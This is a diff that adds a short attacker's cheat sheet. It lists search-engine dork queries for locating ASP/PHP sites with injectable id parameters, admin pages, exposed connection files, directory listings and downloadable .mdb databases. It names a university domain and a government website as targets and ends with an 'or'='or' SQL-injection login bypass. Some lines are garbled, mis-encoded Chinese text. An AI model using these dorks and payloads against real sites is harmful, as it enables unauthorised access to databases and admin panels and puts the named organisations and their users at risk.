@@ -1,0 +1,24 @@
+inurl:asp?id=
+inurl:php?id=
+inurl:admin
+±©¿â
+inurl:/inc/conn.asp  inurl:/inc+conn.asp to parent directory intext:
+inurl:inc+conn.asp
+to parent directory
+last modified Description
+intitle intext
+inurl site
+intext:to parent directory+intext:mdb site:fudan.edu.cn
+
+¸ß¼¶±©¿â
+inurl:./..admin../..add..
+inurl:./..admin../..del..
+inurl:/.asp<id=<%<%<%
+
+http://www.jnhrss.gov.cn/
+
+#sdsf.mdb
+%23sdsf.mdb
+
+admin
+'or'='or'
